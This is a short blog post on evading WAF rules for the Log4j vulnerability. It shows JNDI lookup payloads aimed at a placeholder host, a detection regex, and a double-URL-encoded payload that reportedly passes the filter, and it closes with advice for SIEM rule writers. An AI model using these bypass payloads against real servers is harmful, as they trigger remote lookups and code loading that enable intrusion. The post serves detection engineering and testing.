# Example Log4j Waf Bypass for team Red and Blue


As everyone knows, many tools and payloads have been developed on the Log4j vulnerability. Some security companies have developed rules related to this, and Waf companies have taken measures to secure the patching process and for this future vulnerability.

While testing a bub vulnerability in my vulnerability research process, I was blocked by waf.

* For example, there are 2 payloads below

```javascript
${jndi:ldap://SUBDOMAIN/a}

${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://SUBDOMAIN/a}
```

![enter image description here](https://raw.githubusercontent.com/azizaltuntas/azizaltuntas.github.io/master/_posts/log4j/2.png)

```javascript
(\$|%24)(\{|%7B).*[jJ].*[nN].*[dD].*[iI].*(:|%3A).+
```

As you can see, one is normal and the other is designed to bypass waf. An example regex for this vulnerability is as follows, and the team that creates many rules presumably creates rules according to this regex. The attack is prevented regardless of upper and lower case letters.

When the "jndi" keyword is next to each other or whatever character is in between, it matches it.

![enter image description here](https://raw.githubusercontent.com/azizaltuntas/azizaltuntas.github.io/master/_posts/log4j/1.png)

As we can see when we enter the payload, we get the 403 error.

![enter image description here](https://raw.githubusercontent.com/azizaltuntas/azizaltuntas.github.io/master/_posts/log4j/3.png)

So what happens when we double-encode any letter for "jndi"? So what happens when we double-encode any letter for "jndi"?


![enter image description here](https://raw.githubusercontent.com/azizaltuntas/azizaltuntas.github.io/master/_posts/log4j/4.png)


As you can see, we did not encounter any errors and we received the necessary response.

![enter image description here](https://raw.githubusercontent.com/azizaltuntas/azizaltuntas.github.io/master/_posts/log4j/5.png)

Payload;

```javascript
${${::-j}${::-n}${::-%2564}${::-i}:${::-d}${::-n}${::-s}://log4jbypass.SUBDOMAIN/}
```

In SIEM solutions such as Splunk, attention should be paid to such situations when writing regex, and rules must be written in normal url-encode and double-encode.
